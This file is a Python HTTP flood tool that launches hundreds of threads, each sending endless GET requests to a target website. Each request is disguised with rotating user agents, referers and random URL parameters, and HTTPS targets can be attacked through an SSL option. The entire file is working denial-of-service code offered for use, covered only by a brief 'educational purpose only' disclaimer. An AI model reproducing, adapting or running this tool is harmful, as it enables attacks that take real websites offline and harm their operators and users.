#!/usr/bin/python3
#!/usr/bin/python

# This program is compatible with both python3 and python2
"""
author: alienwhatever

This tool is for testing and edcutional purpose only
I am not responsible for any damage you make
Use this tool at your own risk
"""
from random import choice as randomchoice
import socket
from threading import Thread
from sys import argv
from sys import exit as sysexit
from time import sleep as delay
import string
import ssl
from os import system

def banner():
    #print ('\nThis tool is for testing and edcutional purpose only')
    #print ('I am not responsible for any damage you make')
    #print ('Use this tool at your own risk')
    system('figlet Take it down!')
if len(argv) <= 1:
    banner()
    print ('\n----Usages----')
    print ('./{0[0]} targetwebsite.com 80'.format(argv))
    print ('./{0[0]} targetwebsite.com 80 --w 500'.format(argv))
    print ('./{0[0]} targetwebsite.com 443 ssl'.format(argv))
    print ('./{0[0]} targetwebsite.com 443 ssl showstatus\n'.format(argv))

    print ('[ Options ]')
    print ('--w <500> - Numbers of workers/threads [Default - 500]')
    print ('--p </> - File Path To Dos [Default is /]')
    print ('ssl - Enable ssl connection (To attack https)')
    print ('showstatus - Show HTTP response status in each request\n')

    #sysexit()

domain = str(argv[1])    # target domain name
host = str(socket.gethostbyname(domain))    # get target host name
port = int(argv[2])    # target port
path = '/'
if '--p' in argv[2:]:
    path_index = argv.index('--p')
    path = argv[path_index + 1]

ssl_enable = False
if 'ssl' in argv[2:]:
    ssl_enable = True

showstatus = False
if 'showstatus' in argv[2:]:
    showstatus = True

# search for number_of_workers if user didn't provide it set number_of_workers to 500 by default
number_of_workers = 500
if '--w' in argv[2:]:
    workers_index = argv.index('--w')
    number_of_workers = int(argv[workers_index + 1])

ref = ['https://www.google.com',
       'https://www.yahoo.com',
       'https://www.bing.com/',
       'https://www.yandex.com/',
       'http://www.baidu.com/',
       'http://' + domain + '/']

def create_header(useragent, urlparameter, site_ref):    # create header with different user agent
    global content_length
    header = 'GET {}?={} HTTP/1.1\r\n'.format(path, urlparameter)    # make difference
    #header = 'GET / HTTP/1.1\r\n'
    header += 'Host: {}\r\n'.format(domain)
    header += 'User-Agent: {}\r\n'.format(useragent) # make difference
    header += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n'
    header += 'Accept-Language: en-US,en;q=0.5\r\n'    # ---- make difference ----
    header += 'Accept-Encoding: gzip, deflate\r\n'
    header += 'Upgrade-Insecure-Requests: 1\r\n'
    header += 'Cache-Control: no-store\r\n'
    header += 'Connection: keep-alive\r\n'
    #header += 'Content-Type: application/x-www-form-urlencoded\r\n'
    #header += 'Content-length: 1000\r\n'
    header += 'Referer: {}\r\n\r\n'.format(site_ref) # make difference
    return header


# list of user agents

# ---- credits ------
# chrome user agents - https://www.whatismybrowser.com/guides/the-latest-user-agent/chrome
# firefox user agents - https://www.whatismybrowser.com/guides/the-latest-user-agent/firefox
# safari user agents = https://www.whatismybrowser.com/guides/the-latest-user-agent/safari

user_agent = [
'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/86.0.4240.93 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPad; CPU OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/86.0.4240.93 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPod; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/86.0.4240.93 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Mobile Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0',
'Mozilla/5.0 (X11; Linux i686; rv:82.0) Gecko/20100101 Firefox/82.0',
'Mozilla/5.0 (Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0',
'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:82.0) Gecko/20100101 Firefox/82.0',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0',
'Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0',
'Mozilla/5.0 (iPhone; CPU iPhone OS 10_15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/29.0 Mobile/15E148 Safari/605.1.15',
'zilla/5.0 (iPad; CPU OS 10_15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/29.0 Mobile/15E148 Safari/605.1.15',
'Mozilla/5.0 (iPod touch; CPU iPhone OS 10_15_7 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) FxiOS/29.0 Mobile/15E148 Safari/605.1.15',
'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/82.0',
'Mozilla/5.0 (Android 11; Mobile; LG-M255; rv:82.0) Gecko/82.0 Firefox/82.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0',
'Mozilla/5.0 (X11; Linux i686; rv:78.0) Gecko/20100101 Firefox/78.0',
'Mozilla/5.0 (Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:78.0) Gecko/20100101 Firefox/78.0',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
'Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
'Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPad; CPU OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (iPod touch; CPU iPhone 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
]

#create_header(user_agent)
def attack():
    global number_of_requests
    while True:
        useragent_to_choose = str(randomchoice(user_agent))    # choose a random user agent from user_agent list

        # generate unique url
        random_url_parameter = string.ascii_lowercase + str(string.digits)
        random_url_parameter = str(''.join(randomchoice(random_url_parameter) for i in range(12)))
        site_ref = str(randomchoice(ref))

        header = create_header(useragent_to_choose, random_url_parameter, site_ref)    # create header with difference user agent
        #print (header)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # proxy - host, port = '193.110.78.143', 8080
            s.connect((host, port))

            if ssl_enable:
                s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)
            header = str(header)
            s.send(bytes(header, 'utf-8'))
            if showstatus:
                print (s.recv(13).decode('utf-8'))
                #print (s.recv(1024))
        except Exception as e:
            print (e)

        except socket.error as e:
            print (e)

        #finally:
            #s.close()
            #delay(3)

def main():
    banner()
    print ('\nAttacking {} at {} with {} worker(s)\nPath - {}'.format(host, port, number_of_workers, path))
    for _ in range(number_of_workers):
        Thread(target=attack).start()
        #delay(3)

main()
